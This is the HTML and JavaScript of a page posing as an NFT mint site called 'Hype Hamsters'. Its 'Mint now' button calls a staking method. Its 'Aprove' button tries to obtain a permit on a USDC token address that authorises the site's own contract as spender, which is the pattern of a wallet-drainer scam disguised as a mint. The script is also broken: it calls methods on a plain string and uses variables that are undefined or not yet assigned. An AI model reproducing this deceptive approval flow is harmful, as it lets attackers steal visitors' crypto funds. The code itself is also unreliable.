<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mint Site</title>    
    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/eth-permit@0.2.1/dist/eth-permit.js"></script>  
</head>
<body>
    <Header class="row container"> 
        <a href="index.html" class="logo">
            Hype Hamsters
        </a>
        <div class="toggleMenu" onclick="toggleMenu();"></div>
        <nav class="navigation row">
            <ul class="row">
                <li><a target="_blank" href="https://opensea.io/">Collection</a></li>
                <li><a onclick="w()" class="hero-btn" id="connect-wallet"> Connect Wallet</a>
                    <a class="hero-btn" id="disconnect-wallet"> <img src="icons8-cancel.svg"> </a>
                    <div id="message"></div>
                </li>
                
            </ul>
        </nav>
    </Header>

    <section class="hero row container">
        <div>
            <h6>Mint Now</h6>
            <h1>Our Unique NFT Collection 10k limited nfts</h1>
            <a id="mint" class="hero-btn">Mint now</a>
            <label for="quantity" >Quantity (between 1 and 10):</label>
            <input type="number" id="quantity" name="quantity" value="1" min="1" max="10"> </br>
            <li><a onclick="a()" class="hero-btn" id="aprove"> Aprove</a></li>
        </div>
    </section>

<script type="text/javascript" src="https://unpkg.com/web3@1.6.0/dist/web3.min.js"></script>
<script type="text/javascript" src="/ABI.js"></script>
<script type="text/javascript">
    var account = null;
    var contract = null;

    //const ADDRESS = "0xB9542838da5980212e4Ef3fF848bea5F15834387";
    const ADDRESS = "0x5D7314906944Df364CcFB4d12c6D175695258E30";
    const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
   
    async function w() {
        if(window.ethereum) {
        await window.ethereum.send('eth_requestAccounts');
        window.web3 = new Web3(window.ethereum);
       

        var accounts = await web3.eth.getAccounts();
        account = accounts[0];
        document.getElementById('connect-wallet').textContent = account;
        
        console.log(account);   
        contract = new web3.eth.Contract(ABI, ADDRESS);

        document.getElementById('mint').onclick = () => {
            let value = document.getElementById('quantity').value;
            //const price = web3.utils.toWei(value, 'ether');
            contract.methods.stakeTokens(value).send({ from: account});
        }
        }
    }
    async function a() { 
        if(window) {
            await window.ethereum.send('eth_requestAccounts');
            window.web3 = new Web3(window.ethereum);
            var accounts = await web3.eth.getAccounts();
            account = accounts[0];
            const a = await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
            const result = await signDaiPermit(window.ethereum, prc20, account, ADDRESS);
        }
    }
    
</script>
</body>
</html>